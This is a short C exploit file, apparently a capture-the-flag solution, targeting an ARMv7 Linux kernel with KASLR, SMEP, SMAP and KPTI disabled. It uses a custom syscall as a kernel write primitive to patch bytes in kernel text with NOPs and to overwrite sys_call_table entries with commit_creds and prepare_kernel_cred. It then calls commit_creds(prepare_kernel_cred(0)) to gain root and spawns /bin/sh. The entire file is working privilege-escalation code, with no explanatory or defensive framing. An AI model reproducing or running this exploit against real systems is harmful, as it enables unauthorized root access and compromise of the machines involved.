// no kaslr, smep, smap, kpti
// gcc -m32 -o xpl xpl.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>

// KASLR is disabled, we can statically encode addr from /proc/kallsyms
// kernel .text no write prot, patch bytes with nops
// addr: 0x8003f56c-12
#define COMMIT_CREDS        "\x60\xf5\x03\x80"
// addr: 0x8003f924
#define PREPARE_KERNEL_CRED "\x24\xf9\x03\x80"

#define SYS_CALL_TABLE      0x8000e348
#define SYS_UPPER           223
#define SYS_COMMIT          25
#define SYS_PREPARE         13

int main(int argc, char** argv) {
  // syscalls 17/18 on armv7 are not implemented
  unsigned int** sys_call_table = (unsigned int **)SYS_CALL_TABLE;
  // patch byte from commit_creds-12 with nops for valid addr
  syscall(
    SYS_UPPER,
    "\x01\x10\xa0\xe1\x01\x10\xa0\xe1\x01\x10\xa0\xe1",
    0x8003f56c-12
  );
  syscall(SYS_UPPER, COMMIT_CREDS, &sys_call_table[SYS_COMMIT]);
  syscall(SYS_UPPER, PREPARE_KERNEL_CRED, &sys_call_table[SYS_PREPARE]);

  // commit_creds(prepare_kernel_cred(0))
  syscall(SYS_COMMIT, syscall(SYS_PREPARE, 0));
  system("/bin/sh");
  return 0;
}
